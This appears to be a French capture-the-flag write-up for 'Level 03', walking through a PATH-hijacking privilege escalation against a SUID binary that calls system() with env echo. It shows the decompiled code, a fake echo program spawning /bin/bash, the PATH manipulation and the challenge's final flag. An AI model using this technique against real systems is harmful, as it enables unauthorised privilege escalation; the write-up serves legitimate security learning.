# Level 03

## 📋 Informations

- **Domaine** : PATH Hijacking / Manipulation d'environnement
- **Objectif** : Exploiter l'appel à une commande système non sécurisée.

---

## 🔍 Exploration

Nous récupérons le binaire `level03` pour l'analyser.
```bash
scp -P 7777 level03@localhost:/home/user/level03/level03 .
```

### Décompilation (Ghidra)

```c
int main(int argc, char **argv, char **envp) {
    // ...
    // Mise en place des droits (SUID/SGID)
    __rgid = getegid();
    __ruid = geteuid();
    setresgid(__rgid, __rgid, __rgid);
    setresuid(__ruid, __ruid, __ruid);
    
    // Appel système vulnérable
    iVar1 = system("/usr/bin/env echo Exploit me");
    return iVar1;
}
```

---

## 🛠️ Analyse

Le programme exécute la commande `/usr/bin/env echo Exploit me`.

> [!IMPORTANT]
> **Le rôle de `/usr/bin/env`**
> La commande `env` permet d'exécuter un programme dans un environnement modifié.
> Ici, elle cherche le programme `echo` en parcourant les dossiers définis dans la variable d'environnement **PATH**.

Si nous parvenons à modifier la variable **PATH**, nous pouvons forcer le programme à exécuter **notre** version de `echo` au lieu de l'officielle.
Comme le binaire a les droits SUID (`flag03`), notre faux `echo` sera exécuté avec ces privilèges.

---

## 🔓 Résolution

### 1. Création du chargeur (Fake Echo)
Nous créons un programme C qui lance un shell (ou `getflag`).

```c title:echo.c
#include <stdlib.h>

int main() {
    system("/bin/bash"); // Ou "/bin/getflag"
    return 0;
}
```

Compilation et placement dans un dossier accessible en écriture (ex: `/tmp` ou `/var/crash`) :
```bash
gcc echo.c -o /tmp/echo
```
*(Alternative simple : `echo "/bin/getflag" > /tmp/echo && chmod +x /tmp/echo`)*

### 2. Manipulation du PATH
Nous ajoutons notre dossier `/tmp` au début du PATH pour qu'il soit prioritaire.

```bash
export PATH=/tmp:$PATH
```

### 3. Exploitation
Nous lançons le binaire vulnérable :

```bash
./level03
```

**Résultat :**
Le programme appelle `echo`, trouve `/tmp/echo` (notre exploit), et l'exécute avec les droits de `flag03`.
Un shell s'ouvre.

```bash
getflag
```

**Flag Final :**
```text
qi0maab88jeaj46qoumi7maus
```

---

## 📚 Notions utiles

- **PATH Hijacking** : Technique consistant à tromper un programme sur l'emplacement des exécutables.
- **System vs Execve** : `system()` utilise un shell et l'environnement, `execve` est plus strict.
